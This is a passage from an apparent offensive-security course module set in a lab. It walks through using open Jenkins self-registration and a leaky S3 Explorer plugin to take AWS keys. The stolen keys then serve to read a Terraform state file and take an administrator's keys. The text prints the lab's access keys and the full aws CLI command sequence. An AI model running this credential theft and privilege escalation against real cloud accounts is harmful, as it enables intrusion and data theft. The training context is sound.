Now, let's attempt to navigate to the Jenkins server. We'll type in the IP and the port we discovered earlier (**http://172.30.0.30:8080**).

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/74770b111830e2e8a1d7cb206c23d1f7_MD5.jpg]]

Figure 14: Jenkins in Firefox

The connection will be slow since it is going through multiple layers of tunnels. After a bit of time, however, the page will load. Here we'll find the link to _create an account_.

## 3.5.4. Exploiting Jenkins

Since Jenkins has self-registration open, let's start by creating an account so we can enumerate further. We'll click the _create an account_ link and enter the required information.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/3de2468774a738ddbf8b17761ada847e_MD5.jpg]]

Figure 15: Create Account Jenkins

As soon as we create an account, we'll be logged in to Jenkins. The authorization strategy in Jenkins is unusual. The default installation for Jenkins has very rudimentary authorization by which either any user (including unauthenticated) can do anything, any logged-in user can do anything, or the _admin_ user can do anything, and every _other_ user has _read-only_. More advanced configurations are possible, but it requires Jenkins to have additional plugins installed, like the [Matrix Authorization Strategy](https://plugins.jenkins.io/matrix-auth/) or [Role-based Authorization Strategy](https://plugins.jenkins.io/role-strategy/) plugins.

We'll have to navigate around to find what our user does and does not have access to. Let's first navigate to the _Dashboard_ by clicking the link at the top left.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/c4744e11aa389077759ff8a663a4a9f8_MD5.jpg]]

Figure 16: Navigate to Dashboard

From here, we'll find a few projects. One of them is named _hackshort_; we'll assume this is the one that updates the _hackshort container_ that resulted in us obtaining a shell. We also find a project titled _company-dir_. Let's investigate this further by clicking on the name.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/02bf5007355e1c846144c08c267db8ea_MD5.jpg]]

Figure 17: Company Directory

From the list of actions (_Status_, _Changes_, _Build now_, and _S3 Explorer_), we find that we're very limited in the things we can do here. Typically, if we have full privileges on a project, we would be able to edit the configuration. However, the _S3 Explorer_ option is very interesting.

S3 Explorer is not a default plugin installed on Jenkins. If we search online for the **S3 Explorer Jenkins Plugin**, [we find the homepage](https://plugins.jenkins.io/s3explorer/) with a banner stating that there is a vulnerability affecting the plugin. The vulnerability states that the application has AWS secrets displayed without masking.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/8f47a1ee8f6264946f2d6227fe880e79_MD5.jpg]]

Figure 18: Warning on Plugin Homepage

Reading the rest of the description, we find that this plugin is a Jenkins implementation of the [aws-js-s3-explorer project](https://github.com/awslabs/aws-js-s3-explorer/tree/v2-alpha). This is particularly interesting to us because on the page for the repository, we find the following description of the project:

AWS JavaScript S3 Explorer (v2 alpha) is a JavaScript application that uses AWS's JavaScript SDK and S3 APIs to make the contents of an S3 bucket easy to browse via a web browser. We've created this to enable easier sharing and management of objects and data in Amazon S3.

The **index.html**, **explorer.js**, and **explorer.css** files in this bucket contain the entire application.

Since the entire application is in those three files, and the page is using JavaScript to explore an S3 Bucket, this means the _AWS ID_ and _key_ should be accessible in the source of the page. Let's click on the _S3 Explorer_ option in Jenkins and search for the ID and key.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/c910cb369d320db7b86ad717a9c56ea3_MD5.jpg]]

Figure 19: Navigating to S3 Explorer

When the page loads, we find the bucket that is configured to be listed: _company-directory-9b58rezp3vvkf90f_.

Since the connections to Jenkins are slow, the S3 explorer plugin often contains issues that the bucket does not list. This does not change the contents of the HTML, and we can continue with the exploit.

We do not find the keys, however. Let's right-click anywhere on the page and click _View Source_.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/f174d9e790e650ab9857acc060f22032_MD5.jpg]]

Figure 20: View Source on S3 Explorer

This will provide us with the HTML of the page where we can search for the AWS credentials.

```
...<div id="page-wrapper" ng-controller="SettingsController"></div></div><input id="awsregion" type="hidden" value="us-east-1"><input id="awsid" type="hidden" value="AKIAUBHUBEGIMWGUDSWQ"><input id="awskey" type="hidden" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5"><input id="bucket" type="hidden" value="company-directory-9b58rezp3vvkf90f"></div></div><footer class="page-footer"><div class="container-fluid"><div class="page-footer__flex-row"><div class="page-footer__footer-id-placeholder" id="footer"></div><div class="page-footer__links page-footer__links--white jenkins_ver"><a rel="noopener noreferrer" href="https://www.jenkins.io/" target="_blank">Jenkins 2.385</a></div></div></div></footer></body></html><script src="http://automation.offseclab.io/plugin/s3explorer/js/s3explorer.js"></script>
```

> Listing 50 - Finding AWS Key in Source

When we scan the HTML, we find several hidden inputs: _awsregion_, _awsid_, and _awskey_, each of which contains values that match AWS credentials. Let's make a note of these and attempt to use them in our AWS cli tool.

#### Labs

1. Discover the file with the flag in one of the S3 buckets.

Answer

## 3.5.5. Enumerating with Discovered Credentials

Now that we've discovered some credentials, let's use them to attempt to enumerate the target environment further. We'll start by running the **configure** subcommand with our **aws** client. We'll save these credentials in the **stolen-s3** profile by using the **--profile** option.

```
kali@kali:~$ aws configure --profile=stolen-s3
AWS Access Key ID [None]: AKIAUBHUBEGIMWGUDSWQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```

> Listing 51 - Configuring stolen-s3 AWS S3 Profile

Once configured, we'll once again use **aws** with the **--profile=stolen-s3** argument to obtain the _Account ID_ and the _username_ associated with the credentials. This will also confirm that the credentials are valid. We'll do this by using the **sts** command and the **get-caller-identity** subcommand.

```
kali@kali:~$ aws --profile=stolen-s3 sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGIFYDAVQPLB",
    "Account": "347537569308",
    "Arn": "arn:aws:iam::277537169808:user/s3_explorer"
}
```

> Listing 52 - Getting the Account ID and User Name

While the contents of the output are not groundbreaking, it does tell us that the credentials are valid and, based on the username, specifically made for the S3 Explorer. If configured correctly, these credentials will be limited in what they can do. Let's attempt to list the user policies attached to the user. This time, we'll use the **iam** command and the **list-user-policies** subcommand. We'll provide the username we found from the output in the Listing above with the **--user-name** option.

```
kali@kali:~$ aws --profile=stolen-s3 iam list-user-policies --user-name s3_explorer

An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::277537169808:user/s3_explorer is not authorized to perform: iam:ListUserPolicies on resource: user s3_explorer because no identity-based policy allows the iam:ListUserPolicies action
```

> Listing 53 - Failing to List the User Policies Attached to Configured User

Unfortunately, the user doesn't even have access to list their own policy. So what does the user have access to? We could _brute force_ every action and find the ones that are allowed. However, we can also approach this more methodically.

The purpose of the credentials was to list the _company-directory-9b58rezp3vvkf90f_ bucket. Let's use the **s3** command with the **ls** subcommand to list its contents.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
2023-07-06 13:49:19        117 Alen.I.vcf
2023-07-06 13:49:19        118 Goran.B.vcf
2023-07-06 13:49:19        117 Zeljko.B.vcf

```

> Listing 54 - Listing S3 Bucket for Company Directory

As expected, this worked! Let's try to take it one step further and list all the buckets in the account. To do so, we'll need to use **s3api** and the **list-buckets** subcommand.

```
kali@kali:~$ aws --profile=stolen-s3 s3api list-buckets
{
    "Buckets": [
        {
            "Name": "company-directory-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        },
        {
            "Name": "tf-state-9b58rezp3vvkf90f",
            "CreationDate": "2023-07-06T16:21:16+00:00"
        }
    ]
    ...
}
```

> Listing 55 - Listing all Buckets From stolen-s3 Account

When we list the buckets, we _do_ find the _company-directory_ bucket that was listed when we visited the S3 Explorer page. We _also_ find a bucket that's prefixed with _tf-state_. The acronym "tf" in cloud environments often refers to [Terraform](https://www.terraform.io/), and a Terraform state often refers to the file that is used to store the current configuration, including _potential secrets_. Let's investigate further!

## 3.5.6. Discovering the State File and Escalating to Admin

Our goal now is to read the Terraform state file. We must have the _read_ permission attached to the account in order to accomplish this. However, we need to know the name of the file to read. To do this, we need the _list_ permission, which allows us to to list the object in the bucket in order to discover the name of the state file. While the list permission isn't neccessary, if we have both permissions, we should be able to easily review the state file and potentially find some secrets.

Let's start by listing the _tf-state_ bucket. We'll use the **aws** command with the **profile** option to specify the obtained credentials (**stolen-s3**). Then, we'll use the **s3** command with the **ls** subcommand to list the bucket.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f    
2023-07-06 12:19:16       6731 terraform.tfstate
```

> Listing 56 - Listing the Terraform State Bucket

It seems we have permission to list the bucket! Next, let's try to read the file. We'll do this by copying the file to our local Kali instance. Again, we'll use the **aws s3** command, but this time with the **cp** operation to copy **terraform.tfstate** from the _tf-state-9b58rezp3vvkf90f_ bucket to the current directory. We also need to add the **s3://** directive to the bucket name to instruct the AWS CLI that we're copying from an S3 bucket rather than a local folder.

```
kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
```

> Listing 57 - Copying Terraform State File To Our Local Kali Instance

We were able to successfully download the file! Let's open the file and begin reviewing it. We'll review the file in sections.

```
kali@kali:~$ cat -n terraform.tfstate
001  {
...
007      "user_list": {
008        "value": [
009          {
010            "email": "Goran.Bregovic@offseclab.io",
011            "name": "Goran.B",
012            "phone": "+1 555-123-4567",
013            "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
014          },
015          {
016            "email": "Zeljko.Bebek@offseclab.io",
017            "name": "Zeljko.B",
018            "phone": "+1 555-123-4568",
019            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
020          },
021          {
022            "email": "Alen.Islamovic@offseclab.io",
023            "name": "Alen.I",
024            "phone": "+1 555-123-4569",
025            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
026          }
027        ],
...
041    },
```

> Listing 58 - Reviewing State File - Users

The first part of the Terraform state file is where we find the list of users and their associated policies. We find three users, two of which have _ReadOnlyAccess_, but the first one, _Goran.B_, has _AdministratorAccess_. Hopefully, we can discover this user's AWS ID and Key in this state file. Let's continue reviewing the file.

```
042    "resources": [
043      {
...
049          {
050            "index_key": "Alen.I",
051            "schema_version": 0,
052            "attributes": {
...
056              "id": "AKIAUBHUBEGIKIZJ7OEI",
...
059              "secret": "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",
...
063            },
...
069          },
070          {
071            "index_key": "Goran.B",
072            "schema_version": 0,
073            "attributes": {
...
077              "id": "AKIAUBHUBEGIGZN3IP46",
...
080              "secret": "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",
...
084            },
...
090          },
...
```

> Listing 59 - Reviewing State File - Keys

As we scroll down in the file, we start to discover attributes for the created users, including their _ID_ and _Secret_. Since we found that _Goran.B_ might have _administrator_ access, let's use **aws** to **configure** a new **profile**. We'll call this profile _goran.b_ and provide the the _ID_, _Key_, and _region_.

```
kali@kali:~$ aws configure --profile=goran.b                                                 
AWS Access Key ID [None]: AKIAUBHUBEGIGZN3IP46
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 

```

> Listing 60 - Configuring Goran.B Profile Using AWS CLI

Next, let's try to list the attached user policies in order to confirm that this user is indeed an _administrator_. We'll do this with the **iam** command and the **list-attached-user-policies** option while providing the **user-name**.

```
kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

> Listing 61 - Listing Attached User Policies With Goran.B Profile

Excellent! We have successfully escalated to _administrator_ in the Cloud account for this environment!

#### Labs

1. Discover the flag in the _ec2_ instance tag.

Answer

## 3.6. Wrapping Up

In this Learning Module, we found an application as the initial target. Through open-source intelligence gathering, we discovered that the application uses a dependency not listed in the public Python index. We assumed that if we were to publish a dependency higher than the version we discovered, the target would download and use our malicious dependency. This assumption was correct, and we were able to obtain code execution in production.

With code execution, we were able to scan the internal networks for additional services. We discovered a Jenkins server that had self-registration enabled. By creating an account, we were able to discover a vulnerable plugin in use that leaked AWS keys.

We enumerated the permissions we had with these keys and were able to discover an S3 bucket that contained a Terraform state file. While reviewing the state file, we were able to discover credentials for an administrator, resulting in full compromise of the environment.

We made some changes during this Module that might cause issues if not reverted. We created two files (**~/.pypirc** and **~/.config/pip/pip.conf**) that change pip's default configuration. We should remove these.

```
kali@kali:~$ rm ~/.pypirc

kali@kali:~$ rm ~/.config/pip/pip.conf
```

> Listing 62 - Removing pip Configuration Files

We also enabled the SOCKS proxy in Firefox in our Personal Kali. We should also remove this setting since the SOCKS proxy will be closed.

To avoid issues with DNS in the future, we also need to reset our personal Kali machine's DNS settings. To do this, we'll use **nmcli** with the **connection modify** subcommands to change our connection ("Wired connection 1" in our case) to have an empty _ipv4.dns_ setting. If you have a preferred DNS server you use, this would be the time to set that instead.

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns ""
                                                                             
kali@kali:~$ sudo systemctl restart NetworkManager  
```

> Listing 63 - Resetting the DNS Settings

We can ensure everything is working as expected by navigating to any public site in the web browser.